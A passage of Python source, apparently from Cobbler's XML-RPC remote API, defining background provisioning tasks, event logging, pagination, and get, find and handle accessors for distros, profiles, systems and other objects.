\"syncsystems\", \"Syncsystems\", options)\n\n    def background_hardlink(self, options: dict, token: str) -> str:\n        \"\"\"\n        Hardlink all files as a background task.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            self.remote.api.hardlink()\n\n        return self.__start_task(runner, token, \"hardlink\", \"Hardlink\", options)\n\n    def background_validate_autoinstall_files(self, options: dict, token: str) -> str:\n        \"\"\"\n        Validate all autoinstall files in the background.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            return self.remote.api.validate_autoinstall_files()\n\n        return self.__start_task(runner, token, \"validate_autoinstall_files\", \"Automated installation files validation\",\n                                 options)\n\n    def background_replicate(self, options: dict, token: str) -> str:\n        \"\"\"\n        Replicate Cobbler in the background to another Cobbler instance.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            # FIXME: defaults from settings here should come from views, fix in views.py\n            self.remote.api.replicate(\n                self.options.get(\"master\", None),\n                self.options.get(\"port\", \"\"),\n                self.options.get(\"distro_patterns\", \"\"),\n                self.options.get(\"profile_patterns\", \"\"),\n                self.options.get(\"system_patterns\", \"\"),\n                self.options.get(\"repo_patterns\", \"\"),\n                self.options.get(\"image_patterns\", \"\"),\n                self.options.get(\"mgmtclass_patterns\", \"\"),\n                self.options.get(\"package_patterns\", \"\"),\n                self.options.get(\"file_patterns\", \"\"),\n                self.options.get(\"prune\", False),\n                self.options.get(\"omit_data\", False),\n                self.options.get(\"sync_all\", False),\n                self.options.get(\"use_ssl\", False),\n            )\n\n        return self.__start_task(runner, token, \"replicate\", \"Replicate\", options)\n\n    def background_import(self, options: dict, token: str) -> str:\n        \"\"\"\n        Import an ISO image in the background.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            self.remote.api.import_tree(\n                self.options.get(\"path\", None),\n                self.options.get(\"name\", None),\n                self.options.get(\"available_as\", None),\n                self.options.get(\"autoinstall_file\", None),\n                self.options.get(\"rsync_flags\", None),\n                self.options.get(\"arch\", None),\n                self.options.get(\"breed\", None),\n                self.options.get(\"os_version\", None),\n            )\n\n        return self.__start_task(runner, token, \"import\", \"Media import\", options)\n\n    def background_reposync(self, options: dict, token: str) -> str:\n        \"\"\"\n        Run a reposync in the background.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            # NOTE: WebUI passes in repos here, CLI passes only:\n            repos = options.get(\"repos\", [])\n            only = options.get(\"only\", None)\n            if only is not None:\n                repos = [only]\n            nofail = options.get(\"nofail\", len(repos) > 0)\n\n            if len(repos) > 0:\n                for name in repos:\n                    self.remote.api.reposync(\n                        tries=self.options.get(\"tries\", 3),\n                        name=name, nofail=nofail)\n            else:\n                self.remote.api.reposync(\n                    tries=self.options.get(\"tries\", 3),\n                    name=None, nofail=nofail)\n\n        return self.__start_task(runner, token, \"reposync\", \"Reposync\", options)\n\n    def background_power_system(self, options: dict, token: str) -> str:\n        \"\"\"\n        Power a system asynchronously in the background.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            for x in self.options.get(\"systems\", []):\n                try:\n                    system_id = self.remote.get_system_handle(x, token)\n                    system = self.remote.__get_object(system_id)\n                    self.remote.api.power_system(system, self.options.get(\"power\", \"\"))\n                except Exception as e:\n                    self.logger.warning(\"failed to execute power task on %s, exception: %s\" % (str(x), str(e)))\n\n        self.check_access(token, \"power_system\")\n        return self.__start_task(runner, token, \"power\", \"Power management (%s)\" % options.get(\"power\", \"\"), options)\n\n    def power_system(self, system_id: str, power: str, token: str) -> bool:\n        \"\"\"Execute power task synchronously.\n\n        Returns true if the operation succeeded or if the system is powered on (in case of status).\n        False otherwise.\n\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method. All\n                      tasks require tokens.\n        :param system_id: system handle\n        :param power: power operation (on/off/status/reboot)\n        \"\"\"\n        system = self.__get_object(system_id)\n        self.check_access(token, \"power_system\", system)\n        result = self.api.power_system(system, power)\n        return True if result is None else result\n\n    def background_signature_update(self, options: dict, token: str) -> str:\n        \"\"\"\n        Run a signature update in the background.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            self.remote.api.signature_update()\n\n        self.check_access(token, \"sigupdate\")\n        return self.__start_task(runner, token, \"sigupdate\", \"Updating Signatures\", options)\n\n    def background_mkgrub(self, options, token) -> str:\n        def runner(self):\n            return self.api.create_grub_images()\n\n        return self.__start_task(\n            runner, token, \"create_grub_images\", \"Create bootable GRUB images\", options\n        )\n\n    def get_events(self, for_user: str = \"\") -> dict:\n        \"\"\"\n        Returns a dict(key=event id) = [ statetime, name, state, [read_by_who] ]\n\n        :param for_user: (Optional) Filter events the user has not seen yet. If left unset, it will return all events.\n        :return: A dictionary with all the events (or all filtered events).\n        \"\"\"\n        # return only the events the user has not seen\n        self.events_filtered = {}\n        for (k, x) in list(self.events.items()):\n            if for_user in x[3]:\n                pass\n            else:\n                self.events_filtered[k] = x\n\n        # mark as read so user will not get events again\n        if for_user is not None and for_user != \"\":\n            for (k, x) in list(self.events.items()):\n                if for_user in x[3]:\n                    pass\n                else:\n                    self.events[k][3].append(for_user)\n\n        return self.events_filtered\n\n    def get_event_log(self, event_id: str) -> str:\n        \"\"\"\n        Returns the contents of a task log. Events that are not task-based do not have logs.\n\n        :param event_id: The event-id generated by Cobbler.\n        :return: The event log or a ``?``.\n        \"\"\"\n        event_id = str(event_id).replace(\"..\", \"\").replace(\"/\", \"\")\n        path = \"/var/log/cobbler/tasks/%s.log\" % event_id\n        self._log(\"getting log for %s\" % event_id)\n        if os.path.exists(path):\n            fh = open(path, \"r\")\n            data = str(fh.read())\n            fh.close()\n            return data\n        else:\n            return \"?\"\n\n    def __generate_event_id(self, optype: str) -> str:\n        \"\"\"\n        Generate an event id based on the current timestamp\n\n        :param optype: Append an additional str to the event-id\n        :return: An id in the format: \"<4 digit year>-<2 digit month>-<two digit day>_<2 digit hour><2 digit minute>\n                 <2 digit second>_<optional string>\"\n        \"\"\"\n        (year, month, day, hour, minute, second, weekday, julian, dst) = time.localtime()\n        return \"%04d-%02d-%02d_%02d%02d%02d_%s\" % (year, month, day, hour, minute, second, optype)\n\n    def _new_event(self, name: str):\n        \"\"\"\n        Generate a new event in the in memory event list.\n\n        :param name: The name of the event.\n        \"\"\"\n        event_id = self.__generate_event_id(\"event\")\n        event_id = str(event_id)\n        self.events[event_id] = [float(time.time()), str(name), EVENT_INFO, []]\n\n    def __start_task(self, thr_obj_fn, token: str, role_name: str, name: str, args: dict, on_done=None):\n        \"\"\"\n        Starts a new background task.\n\n        :param thr_obj_fn: function handle to run in a background thread\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method. All\n                      tasks require tokens.\n        :param role_name: used to check token against authn/authz layers\n        :param name: display name to show in logs/events\n        :param args: usually this is a single dict, containing options\n        :param on_done: an optional second function handle to run after success (and only success)\n        :return: a task id.\n        \"\"\"\n        self.check_access(token, role_name)\n        event_id = self.__generate_event_id(role_name)  # use short form for logfile suffix\n        event_id = str(event_id)\n        self.events[event_id] = [float(time.time()), str(name), EVENT_RUNNING, []]\n\n        self._log(\"start_task(%s); event_id(%s)\" % (name, event_id))\n\n        thr_obj = CobblerThread(event_id, self, args, role_name, self.api)\n        thr_obj._run = thr_obj_fn\n        if on_done is not None:\n            thr_obj.on_done = on_done.__get__(thr_obj, CobblerThread)\n        thr_obj.start()\n        return event_id\n\n    def _set_task_state(self, thread_obj, event_id: str, new_state):\n        \"\"\"\n        Set the state of the task. (For internal use only)\n\n        :param thread_obj: Not known what this actually does.\n        :param event_id: The event id, generated by __generate_event_id()\n        :param new_state: The new state of the task.\n        \"\"\"\n        event_id = str(event_id)\n        if event_id in self.events:\n            self.events[event_id][2] = new_state\n            self.events[event_id][3] = []  # clear the list of who has read it\n        if thread_obj is not None:\n            if new_state == EVENT_COMPLETE:\n                thread_obj.logger.info(\"### TASK COMPLETE ###\")\n            if new_state == EVENT_FAILED:\n                thread_obj.logger.error(\"### TASK FAILED ###\")\n\n    def get_task_status(self, event_id: str):\n        \"\"\"\n        Get the current status of the task.\n\n        :param event_id: The unique id of the task.\n        :return: The event status.\n        \"\"\"\n        event_id = str(event_id)\n        if event_id in self.events:\n            return self.events[event_id]\n        else:\n            raise CX(\"no event with that id\")\n\n    def last_modified_time(self, token=None) -> float:\n        \"\"\"\n        Return the time of the last modification to any object. Used to verify from a calling application that no\n        Cobbler objects have changed since last check. This method is implemented in the module api under the same name.\n\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: 0 if there is no file where the information required for this method is saved.\n        \"\"\"\n        return self.api.last_modified_time()\n\n    def ping(self) -> bool:\n        \"\"\"\n        Deprecated method. Now does nothing.\n\n        :return: Always True\n        \"\"\"\n        return True\n\n    def get_user_from_token(self, token: str):\n        \"\"\"\n        Given a token returned from login, return the username that logged in with it.\n\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The username if the token was valid.\n        :raises CX: If the token supplied to the function is invalid.\n        :raises ValueError: In case \"token\" did not fulfil the requirements to be a token.\n        \"\"\"\n        if not CobblerXMLRPCInterface.__is_token(token):\n            raise ValueError(\"\\\"token\\\" did not have the correct format or type!\")\n        if token not in self.token_cache:\n            raise CX(\"invalid token: %s\" % token)\n        else:\n            return self.token_cache[token][1]\n\n    def _log(self, msg: str, token: Optional[str] = None, name: Optional[str] = None, object_id: Optional[str] = None,\n             attribute: Optional[str] = None, debug: bool = False, error: bool = False):\n        \"\"\"\n        Helper function to write data to the log file from the XMLRPC remote implementation.\n        Takes various optional parameters that should be supplied when known.\n\n        :param msg: The message to log.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param name: The name of the object should be supplied when it is known.\n        :param object_id: The object id should be supplied when it is known.\n        :param attribute: Additional attributes should be supplied if known.\n        :param debug: If the message logged is a debug message.\n        :param error: If the message logged is an error message.\n        \"\"\"\n        if not all((isinstance(error, bool), isinstance(debug, bool), isinstance(msg, str))):\n            return\n        # add the user editing the object, if supplied\n        m_user = \"?\"\n        if token is not None:\n            try:\n                m_user = self.get_user_from_token(token)\n            except:\n                # invalid or expired token?\n                m_user = \"???\"\n        msg = \"REMOTE %s; user(%s)\" % (msg, m_user)\n\n        if name is not None:\n            if not validate_obj_name(name):\n                return\n            msg = \"%s; name(%s)\" % (msg, name)\n\n        if object_id is not None:\n            if not validate_obj_id(object_id):\n                return\n            msg = \"%s; object_id(%s)\" % (msg, object_id)\n\n        # add any attributes being modified, if any\n        if attribute:\n            if (isinstance(attribute, str) and attribute.isidentifier()) or keyword.iskeyword(attribute):\n                return\n            msg = \"%s; attribute(%s)\" % (msg, attribute)\n\n        # log to the correct logger\n        if error:\n            self.logger.error(msg)\n        elif debug:\n            self.logger.debug(msg)\n        else:\n            self.logger.info(msg)\n\n    def __sort(self, data, sort_field: Optional[str] = None):\n        \"\"\"\n        Helper function used by the various find/search functions to return object representations in order.\n\n        :param data: The data to sort.\n        :param sort_field: If the field contained in this starts with \"!\" then this sorts backwards.\n        :return: The data sorted by the ``sort_field``.\n        \"\"\"\n        sort_fields = [\"name\"]\n        sort_rev = False\n        if sort_field is not None:\n            if sort_field.startswith(\"!\"):\n                sort_field = sort_field[1:]\n                sort_rev = True\n            sort_fields.insert(0, sort_field)\n        sortdata = [(x.sort_key(sort_fields), x) for x in data]\n        if sort_rev:\n            sortdata.sort(reverse=True)\n        else:\n            sortdata.sort()\n        return [x for (key, x) in sortdata]\n\n    def __paginate(self, data, page=1, items_per_page=25, token=None):\n        \"\"\"\n        Helper function to support returning parts of a selection, for example, for use in a web app where only a part\n        of the results are to be presented on each screen.\n\n        :param data: The data to paginate.\n        :param page: The page to show.\n        :param items_per_page: The number of items per page.\n        :param token: The API-token obtained via the login() method.\n        :return: The paginated items.\n        \"\"\"\n        default_page = 1\n        default_items_per_page = 25\n\n        try:\n            page = int(page)\n            if page < 1:\n                page = default_page\n        except:\n            page = default_page\n        try:\n            items_per_page = int(items_per_page)\n            if items_per_page <= 0:\n                items_per_page = default_items_per_page\n        except:\n            items_per_page = default_items_per_page\n\n        num_items = len(data)\n        num_pages = ((num_items - 1) // items_per_page) + 1\n        if num_pages == 0:\n            num_pages = 1\n        if page > num_pages:\n            page = num_pages\n        start_item = (items_per_page * (page - 1))\n        end_item = start_item + items_per_page\n        if start_item > num_items:\n            start_item = num_items - 1\n        if end_item > num_items:\n            end_item = num_items\n        data = data[start_item:end_item]\n\n        if page > 1:\n            prev_page = page - 1\n        else:\n            prev_page = None\n        if page < num_pages:\n            next_page = page + 1\n        else:\n            next_page = None\n\n        return (data, {\n            'page': page,\n            'prev_page': prev_page,\n            'next_page': next_page,\n            'pages': list(range(1, num_pages + 1)),\n            'num_pages': num_pages,\n            'num_items': num_items,\n            'start_item': start_item,\n            'end_item': end_item,\n            'items_per_page': items_per_page,\n            'items_per_page_list': [10, 20, 50, 100, 200, 500],\n        })\n\n    def __get_object(self, object_id: str):\n        \"\"\"\n        Helper function. Given an object id, return the actual object.\n\n        :param object_id: The id for the object to retrieve.\n        :return: The item to the corresponding id.\n        \"\"\"\n        if object_id.startswith(\"___NEW___\"):\n            return self.object_cache[object_id][1]\n        (otype, oname) = object_id.split(\"::\", 1)\n        return self.api.get_item(otype, oname)\n\n    def get_item(self, what: str, name: str, flatten=False):\n        \"\"\"\n        Returns a dict describing a given object.\n\n        :param what: \"distro\", \"profile\", \"system\", \"image\", \"repo\", etc\n        :param name: the object name to retrieve\n        :param flatten: reduce dicts to string representations (True/False)\n        :return: The item or None.\n        \"\"\"\n        self._log(\"get_item(%s,%s)\" % (what, name))\n        item = self.api.get_item(what, name)\n        if item is not None:\n            item = item.to_dict()\n        if flatten:\n            item = utils.flatten(item)\n        return self.xmlrpc_hacks(item)\n\n    def get_distro(self, name: str, flatten=False, token=None, **rest):\n        \"\"\"\n        Get a distribution.\n\n        :param name: The name of the distribution to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"distro\", name, flatten=flatten)\n\n    def get_profile(self, name: str, flatten=False, token=None, **rest):\n        \"\"\"\n        Get a profile.\n\n        :param name: The name of the profile to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"profile\", name, flatten=flatten)\n\n    def get_system(self, name: str, flatten=False, token=None, **rest):\n        \"\"\"\n        Get a system.\n\n        :param name: The name of the system to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"system\", name, flatten=flatten)\n\n    def get_repo(self, name: str, flatten=False, token=None, **rest):\n        \"\"\"\n        Get a repository.\n\n        :param name: The name of the repository to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"repo\", name, flatten=flatten)\n\n    def get_image(self, name: str, flatten=False, token=None, **rest):\n        \"\"\"\n        Get an image.\n\n        :param name: The name of the image to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"image\", name, flatten=flatten)\n\n    def get_mgmtclass(self, name: str, flatten=False, token=None, **rest):\n        \"\"\"\n        Get a management class.\n\n        :param name: The name of the management class to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"mgmtclass\", name, flatten=flatten)\n\n    def get_package(self, name: str, flatten=False, token=None, **rest):\n        \"\"\"\n        Get a package.\n\n        :param name: The name of the package to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"package\", name, flatten=flatten)\n\n    def get_file(self, name: str, flatten=False, token=None, **rest):\n        \"\"\"\n        Get a file.\n\n        :param name: The name of the file to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"file\", name, flatten=flatten)\n\n    def get_menu(self, name: str, flatten: bool = False, token=None, **rest):\n        \"\"\"\n        Get a menu.\n\n        :param name: The name of the file to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"menu\", name, flatten=flatten)\n\n    def get_items(self, what: str):\n        \"\"\"\n        Individual list elements are the same for get_item.\n\n        :param what: is the name of a Cobbler object type, as described for get_item.\n        :return: This returns a list of dicts.\n        \"\"\"\n        items = [x.to_dict() for x in self.api.get_items(what)]\n        return self.xmlrpc_hacks(items)\n\n    def get_item_names(self, what: str):\n        \"\"\"\n        This is just like get_items, but transmits less data.\n\n        :param what: is the name of a Cobbler object type, as described for get_item.\n        :return: Returns a list of object names (keys) for the given object type.\n        \"\"\"\n        return [x.name for x in self.api.get_items(what)]\n\n    def get_distros(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all distributions.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list with all distros.\n        \"\"\"\n        return self.get_items(\"distro\")\n\n    def get_profiles(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all profiles.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list with all profiles.\n        \"\"\"\n        return self.get_items(\"profile\")\n\n    def get_systems(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all Systems.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list of all systems.\n        \"\"\"\n        return self.get_items(\"system\")\n\n    def get_repos(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all repositories.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list of all repositories.\n        \"\"\"\n        return self.get_items(\"repo\")\n\n    def get_images(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all images.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list of all images.\n        \"\"\"\n        return self.get_items(\"image\")\n\n    def get_mgmtclasses(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all managementclasses.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list of all managementclasses.\n        \"\"\"\n        return self.get_items(\"mgmtclass\")\n\n    def get_packages(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all packages.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list of all packages tracked in Cobbler.\n        \"\"\"\n        return self.get_items(\"package\")\n\n    def get_files(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all files.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list of all files.\n        \"\"\"\n        return self.get_items(\"file\")\n\n    def get_menus(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all menus.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list of all files.\n        \"\"\"\n        return self.get_items(\"menu\")\n\n    def find_items(self, what: str, criteria: Optional[dict] = None, sort_field=None, expand: bool = True) -> list:\n        \"\"\"Works like get_items but also accepts criteria as a dict to search on.\n\n        Example: ``{ \"name\" : \"*.example.org\" }``\n\n        Wildcards work as described by 'pydoc fnmatch'.\n\n        :param what: The object type to find.\n        :param criteria: The criteria an item needs to match.\n        :param sort_field: The field to sort the results after.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :returns: A list of dicts.\n        \"\"\"\n        if criteria is None:\n            criteria = {}\n        # self._log(\"find_items(%s); criteria(%s); sort(%s)\" % (what, criteria, sort_field))\n        if \"name\" in criteria:\n            name = criteria.pop(\"name\")\n            items = self.api.find_items(what, criteria=criteria, name=name)\n        else:\n            items = self.api.find_items(what, criteria=criteria)\n        items = self.__sort(items, sort_field)\n        if not expand:\n            items = [x.name for x in items]\n        else:\n            items = [x.to_dict() for x in items]\n        return self.xmlrpc_hacks(items)\n\n    def find_distro(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find a distro matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All distributions which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"distro\", criteria, expand=expand)\n\n    def find_profile(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find a profile matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All profiles which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"profile\", criteria, expand=expand)\n\n    def find_system(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find a system matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All systems which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"system\", criteria, expand=expand)\n\n    def find_repo(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find a repository matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All repositories which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"repo\", criteria, expand=expand)\n\n    def find_image(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find an image matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All images which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"image\", criteria, expand=expand)\n\n    def find_mgmtclass(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find a management class matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All management classes which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"mgmtclass\", criteria, expand=expand)\n\n    def find_package(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find a package matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All packages which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"package\", criteria, expand=expand)\n\n    def find_file(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find a file matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All files which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"file\", criteria, expand=expand)\n\n    def find_menu(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find a menu matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All files which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"menu\", criteria, expand=expand)\n\n    def find_items_paged(self, what: str, criteria: Optional[dict] = None, sort_field: Optional[str] = None,\n                         page=1, items_per_page=25, token: Optional[str] = None):\n        \"\"\"\n        Returns a list of dicts as with find_items but additionally supports returning just a portion of the total\n        list, for instance in supporting a web app that wants to show a limited amount of items per page.\n\n        :param what: The object type to find.\n        :param criteria: The criteria a distribution needs to match.\n        :param sort_field: The field to sort the results after.\n        :param page: The page to return\n        :param items_per_page: The number of items per page.\n        :param token: The API-token obtained via the login() method.\n        :return: The found items.\n        \"\"\"\n        self._log(\"find_items_paged(%s); criteria(%s); sort(%s)\" % (what, criteria, sort_field), token=token)\n        if criteria is None:\n            items = self.api.get_items(what)\n        else:\n            items = self.api.find_items(what, criteria=criteria)\n        items = self.__sort(items, sort_field)\n        (items, pageinfo) = self.__paginate(items, page, items_per_page)\n        items = [x.to_dict() for x in items]\n        return self.xmlrpc_hacks({\n            'items': items,\n            'pageinfo': pageinfo\n        })\n\n    def has_item(self, what: str, name: str, token: Optional[str] = None):\n        \"\"\"\n        Returns True if a given collection has an item with a given name, otherwise returns False.\n\n        :param what: The collection to search through.\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: True if item was found, otherwise False.\n        \"\"\"\n        self._log(\"has_item(%s)\" % what, token=token, name=name)\n        found = self.api.get_item(what, name)\n        if found is None:\n            return False\n        else:\n            return True\n\n    def get_item_handle(self, what: str, name: str, token=None):\n        \"\"\"\n        Given the name of an object (or other search parameters), return a reference (object id) that can be used with\n        ``modify_*`` functions or ``save_*`` functions to manipulate that object.\n\n        :param what: The collection where the item is living in.\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        found = self.api.get_item(what, name)\n        if found is None:\n            raise CX(\"internal error, unknown %s name %s\" % (what, name))\n        return \"%s::%s\" % (what, found.name)\n\n    def get_distro_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for a distribution which allows you to use the functions ``modify_*`` or ``save_*`` to manipulate\n        it.\n\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"distro\", name, token)\n\n    def get_profile_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for a profile which allows you to use the functions ``modify_*`` or ``save_*`` to manipulate it.\n\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"profile\", name, token)\n\n    def get_system_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for a system which allows you to use the functions ``modify_*`` or ``save_*`` to manipulate it.\n\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"system\", name, token)\n\n    def get_repo_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for a repository which allows you to use the functions ``modify_*`` or ``save_*`` to manipulate it.\n\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"repo\", name, token)\n\n    def get_image_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for an image which allows you to use the functions ``modify_*`` or ``save_*`` to manipulate it.\n\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"image\", name, token)\n\n    def get_mgmtclass_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for a management class which allows you to use the functions ``modify_*`` or ``save_*`` to\n        manipulate it.\n\n        :param name: The name of the 